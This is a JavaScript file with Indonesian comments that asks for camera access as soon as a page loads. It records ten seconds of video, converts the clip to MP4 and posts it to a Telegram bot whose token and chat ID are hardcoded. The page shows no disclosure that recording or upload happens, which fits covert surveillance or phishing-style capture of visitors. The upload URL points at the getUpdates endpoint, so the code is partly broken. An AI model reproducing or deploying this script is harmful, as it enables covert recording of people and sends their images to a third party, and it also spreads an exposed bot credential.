document.addEventListener("DOMContentLoaded", async function () {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("video").srcObject = stream;
        sendToTelegram(stream);
    } catch (error) {
        console.error("Gagal mengakses kamera:", error);
    }
});

async function sendToTelegram(stream) {
    const botToken = "7810176235:AAGsVRjcENBqSAyeL5nLghvJvBNnitVLBDM"; // Ganti dengan token bot Anda
    const chatId = "7961625661"; // Ganti dengan Chat ID Anda
    const url = `https://api.telegram.org/bot7810176235:AAGsVRjcENBqSAyeL5nLghvJvBNnitVLBDM/getUpdates`;

    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
    let chunks = [];

    mediaRecorder.ondataavailable = (event) => {
        chunks.push(event.data);
    };

    mediaRecorder.onstop = async () => {
        const webmBlob = new Blob(chunks, { type: "video/webm" });
        const mp4Blob = await convertWebMtoMP4(webmBlob); // Konversi ke MP4

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("video", mp4Blob, "stream.mp4");

        try {
            await fetch(url, { method: "POST", body: formData });
            console.log("Video MP4 terkirim ke Telegram");
        } catch (error) {
            console.error("Gagal mengirim video ke Telegram:", error);
        }
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 10000); // Rekam selama 10 detik
}

// Fungsi konversi WEBM ke MP4 dengan FFmpeg.wasm
async function convertWebMtoMP4(webmBlob) {
    const { createFFmpeg, fetchFile } = FFmpeg;
    const ffmpeg = createFFmpeg({ log: true });

    await ffmpeg.load();
    ffmpeg.FS("writeFile", "input.webm", await fetchFile(webmBlob));
    await ffmpeg.run("-i", "input.webm", "-c:v", "libx264", "-preset", "ultrafast", "output.mp4");

    const mp4Data = ffmpeg.FS("readFile", "output.mp4");
    const mp4Blob = new Blob([mp4Data.buffer], { type: "video/mp4" });

    ffmpeg.FS("unlink", "input.webm");
    ffmpeg.FS("unlink", "output.mp4");

    return mp4Blob;
        }
